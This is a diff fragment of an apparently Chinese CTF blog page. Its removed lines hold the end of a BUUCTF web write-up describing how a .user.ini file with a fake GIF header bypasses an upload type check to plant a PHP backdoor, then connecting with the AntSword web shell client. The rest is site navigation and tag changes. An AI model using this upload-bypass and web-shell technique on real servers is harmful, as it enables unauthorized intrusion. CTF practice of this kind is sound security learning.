-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5a5854bd-3fac-4eec-b1ea-540fcfeaebae" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0f854947-b236-49a6-ae66-d96e523aa8ca&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="28、CheckIn"><a href="#28、CheckIn" class="headerlink" title="28、CheckIn"></a>28、CheckIn</h4><p>user.ini文件构成PHP后门</p>
-<p>创建<code>.user.ini</code>文件，前面的<code>GIF</code>是为了绕过检测；因为后台用exif_imagetype函数检测文件类型，所以我们在文件前加上图片的特征，来绕过检测</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d95f340e-38ae-4031-822c-3f6235148810" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f9af52b5-a67d-4af4-8823-27f73a90f669" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/57a89ea6-4ffd-4e14-8ef8-06719fe30248" alt="image"></p>
-<p>创建图片文件</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/71797466-704f-4582-ba9e-97f28a1b3f74" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8781da91-2795-4230-ac17-57b131e21631" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6c0d5cd1-1472-4e3a-9a9d-da5b8e7d3325" alt="image"></p>
-<p>蚁剑链接<code>http://3b30b477-b314-466c-bb51-8e982490eea3.node4.buuoj.cn:81/uploads/c55e0cb61f7eb238df09ae30a206e5ee/index.php</code></p>
-<p>试了很久返回数据为空，不知道怎么解决</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/" data-id="cllavjvho0000t8vf6bgrh8c3" data-title="Buuctf Web（25-28）" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -1176,7 +1224,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/CTF/" style="font-size: 16.67px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 16.67px;">Fuzzing</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">Web安全</a> <a href="/tags/learn/" style="font-size: 13.33px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 20px;">论文细读</a>
+      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 17.5px;">Fuzzing</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 12.5px;">Web安全</a> <a href="/tags/learn/" style="font-size: 15px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 20px;">论文细读</a>
     </div>
   </div>
 
@@ -1198,6 +1246,10 @@
       <ul>
         
           <li>
+            <a href="/2024/02/20/20240220/">20240220</a>
+          </li>
+        
+          <li>
             <a href="/2024/02/18/20240218/">20240218</a>
           </li>
         
@@ -1211,10 +1263,6 @@
         
           <li>
             <a href="/2024/02/14/20240214/">20240214</a>
-          </li>
-        
-          <li>
-            <a href="/2024/02/08/Paper-IvySyn%20Automated%20Vulnerability%20Discovery%20in%20Deep%20Learning%20Frameworks/">IvySyn</a>
           </li>
         
       </ul>
